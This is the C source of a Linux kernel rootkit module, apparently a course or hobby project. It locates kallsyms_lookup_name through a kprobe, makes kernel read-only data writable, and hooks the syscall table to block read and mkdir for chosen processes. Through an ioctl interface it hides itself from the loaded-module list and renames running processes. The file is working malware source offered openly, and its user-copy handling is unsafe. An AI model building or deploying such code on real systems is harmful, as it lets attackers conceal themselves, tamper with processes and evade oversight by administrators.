#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"

kallsyms_lookup_name_t kallsyms_lookup_name_fn;
syscall_fn_t *sys_call_table_p;

void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
                            phys_addr_t size, pgprot_t prot);

int is_hidden = 0;
struct filter_info filter_list;
syscall_fn_t custom_handlers[NR_syscalls] = {0};
int total_references[NR_syscalls] = {0};

struct list_head *module_list;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static asmlinkage long my_sys_read(const struct pt_regs *regs) {
  // pr_warn("my_sys_read\n");
  struct filter_info *pos;
  list_for_each_entry(pos, &filter_list.list, list) {
    if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
      pr_info("Filtering read syscall for process %s\n", pos->comm);
      return -EINTR;
    }
  }

  if (total_references[__NR_read] == 0) {
    return sys_call_table_p[__NR_read](regs);
  } else {
    list_for_each_entry(pos, &filter_list.list, list) {
      if (pos->syscall_nr == __NR_read) {
        syscall_fn_t orig_syscall = (syscall_fn_t)pos->orig_handler_addr;
        return orig_syscall(regs);
      }
    }
  }
  return 0; // should never reach here
}

static asmlinkage long my_sys_mkdir(const struct pt_regs *regs) {
  pr_warn("my_sys_mkdir %s\n", current->comm);
  struct filter_info *pos;
  list_for_each_entry(pos, &filter_list.list, list) {
    if (strcmp(pos->comm, current->comm) == 0 &&
        pos->syscall_nr == __NR_mkdir) {
      pr_info("Filtering mkdir syscall for process %s\n", pos->comm);
      return -EINTR;
    }
  }

  if (total_references[__NR_mkdir] == 0) {
    return sys_call_table_p[__NR_mkdir](regs);
  } else {
    list_for_each_entry(pos, &filter_list.list, list) {
      if (pos->syscall_nr == __NR_mkdir) {
        syscall_fn_t orig_syscall = (syscall_fn_t)pos->orig_handler_addr;
        return orig_syscall(regs);
      }
    }
  }
  return 0; // should never reach here
}

void mark_rodata_wr(void) {
  unsigned long section_size;
  unsigned long start_rodata =
      (unsigned long)(kallsyms_lookup_name_fn("__start_rodata"));
  unsigned long init_begin =
      (unsigned long)(kallsyms_lookup_name_fn("__init_begin"));
  section_size = init_begin - start_rodata;
  update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
                      PAGE_KERNEL);
}

static int rootkit_open(struct inode *inode, struct file *filp) {
  printk(KERN_INFO "%s\n", __func__);
  return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
  printk(KERN_INFO "%s\n", __func__);
  return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
  long ret = 0;

  printk(KERN_INFO "%s\n", __func__);

  switch (ioctl) {
  case IOCTL_MOD_HIDE:
    if (!is_hidden) {
      module_list = THIS_MODULE->list.prev;
      list_del(&THIS_MODULE->list);
      is_hidden = 1;
    } else {
      list_add(&THIS_MODULE->list, module_list);
      module_list = NULL;
      is_hidden = 0;
    }
    break;
  case IOCTL_MOD_MASQ:
    struct masq_proc_req *req = (struct masq_proc_req *)kmalloc(
        sizeof(struct masq_proc_req), GFP_KERNEL);
    struct masq_proc_req *usr_req = (struct masq_proc_req *)arg;

    req->list = (struct masq_proc *)kmalloc(
        sizeof(struct masq_proc) * usr_req->len, GFP_KERNEL);
    pr_warn("addrs: %p %p\n", &req->len, &usr_req->len);

    copy_from_user(&req->len, &usr_req->len, sizeof(size_t));
    pr_warn("copy_from_user done with len=%d\n", req->len);

    for (int i = 0; i < req->len; i++) {
      struct masq_proc *entry = &usr_req->list[i];
      copy_from_user(&req->list[i], entry, sizeof(struct masq_proc));
      printk(KERN_WARNING "copy_from_user done with entry %d\n", i);
    }
    pr_warn("copy_from_user done with %d entries\n", req->len);

    for (int i = 0; i < req->len; i++) {
      struct masq_proc *entry = &req->list[i];
      if (strlen(entry->new_name) >= strlen(entry->orig_name)) {
        continue;
      }
      pr_warn("Masquerading %s as %s\n", entry->orig_name, entry->new_name);
      struct task_struct *task;
      for_each_process(task) {
        if (strcmp(task->comm, entry->orig_name) == 0) {
          strncpy(task->comm, entry->new_name, MASQ_LEN);
        }
      }
    }

    kfree(req->list);
    kfree(req);

    break;
  case IOCTL_ADD_FILTER: {
    // copy from user space
    struct filter_info *filter =
        (struct filter_info *)kmalloc(sizeof(struct filter_info), GFP_KERNEL);
    copy_from_user(filter, (struct filter_info *)arg,
                   sizeof(struct filter_info));

    if (filter->syscall_nr < 0 || filter->syscall_nr >= NR_syscalls) {
      // invalid syscall number
      return -EINVAL;
    }

    if (filter->comm[0] == '\0') {
      strncpy(filter->comm, current->comm, TASK_FILTER_LEN);
      // use current process if name not specified
    }

    struct filter_info *pos;

    if (total_references[filter->syscall_nr] > 0) {
      list_for_each_entry(pos, &filter_list.list, list) {
        if (pos->syscall_nr == filter->syscall_nr) {
          // syscall already has a filter owned by other process
          // copy the reference
          filter->orig_handler_addr = pos->orig_handler_addr;
          break;
        }
      }
    } else {
      // syscall hasn't been filtered yet
      filter->orig_handler_addr =
          (unsigned long)sys_call_table_p[filter->syscall_nr];
      sys_call_table_p[filter->syscall_nr] =
          custom_handlers[filter->syscall_nr];
    }

    total_references[filter->syscall_nr] += 1;

    list_add(&filter->list, &filter_list.list);
    break;
  }
  case IOCTL_REMOVE_FILTER: {
    struct filter_info *filter = (struct filter_info *)arg;
    struct filter_info *pos;
    list_for_each_entry(pos, &filter_list.list, list) {
      if (strcmp(pos->comm, filter->comm) == 0 &&
          pos->syscall_nr == filter->syscall_nr) {
        total_references[pos->syscall_nr] -= 1;
        if (total_references[pos->syscall_nr] == 0)
          sys_call_table_p[pos->syscall_nr] =
              (syscall_fn_t)pos->orig_handler_addr;
        list_del(&pos->list);
        kfree(pos);
        break;
      }
    }
    break;
  }
  default:
    ret = -EINVAL;
  }

  return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
  open : rootkit_open,
  unlocked_ioctl : rootkit_ioctl,
  release : rootkit_release,
  owner : THIS_MODULE
};

static int __init rootkit_init(void) {
  major = register_chrdev(0, OURMODNAME, &fops);
  if (major < 0) {
    pr_err("Registering char device failed with %d\n", major);
    return major;
  }

  pr_info("The module was assigned major number %d.\n", major);
  cls = class_create(THIS_MODULE, OURMODNAME);
  device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
  pr_info("Device created on /dev/%s\n", OURMODNAME);

  if (register_kprobe(&kp) < 0) {
    pr_err("register_kprobe failed\n");
    return -1;
  }

  kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);

  sys_call_table_p = (syscall_fn_t *)kallsyms_lookup_name_fn("sys_call_table");
  // TODO: check type of update_mapping_prot
  pr_warn("sys_call_table at %p\n", sys_call_table_p);
  update_mapping_prot = (void *)kallsyms_lookup_name_fn("update_mapping_prot");
  if (!update_mapping_prot) {
    pr_err("Failed to find update_mapping_prot\n");
    return -1;
  }
  mark_rodata_wr();

  // list of all filters by process
  // filter_list = kmalloc(sizeof(struct filter_info), GFP_KERNEL);
  filter_list.syscall_nr = -1;
  INIT_LIST_HEAD(&filter_list.list);

  // hook syscalls
  custom_handlers[__NR_read] = my_sys_read;
  custom_handlers[__NR_mkdirat] = my_sys_mkdir;

  return 0;
}

static void __exit rootkit_exit(void) {
  struct filter_info *pos, *next;

  // unhook syscalls
  for (int syscall_num = 0; syscall_num < NR_syscalls; syscall_num++) {
    if (total_references[syscall_num] > 0) {
      list_for_each_entry(pos, &filter_list.list, list) {
        if (pos->syscall_nr == syscall_num) {
          sys_call_table_p[syscall_num] = (syscall_fn_t)pos->orig_handler_addr;
          break;
        }
      }
    }
  }
  /*
  if (total_references[__NR_read] > 0) {
      list_for_each_entry(pos, &filter_list.list, list) {
          if (pos->syscall_nr == __NR_read) {
              sys_call_table_p[__NR_read] =
  (syscall_fn_t)pos->orig_handler_addr; break;
          }
      }
  }
  */

  // cleanup filter list
  list_for_each_entry_safe(pos, next, &filter_list.list, list) {
    list_del(&pos->list);
    kfree(pos);
  }

  // unmasquerade processes

  // unhide module
  if (is_hidden && module_list) {
    list_add(&THIS_MODULE->list, module_list);
  }

  pr_info("%s: removed\n", OURMODNAME);
  device_destroy(cls, MKDEV(major, 0));
  class_destroy(cls);
  unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
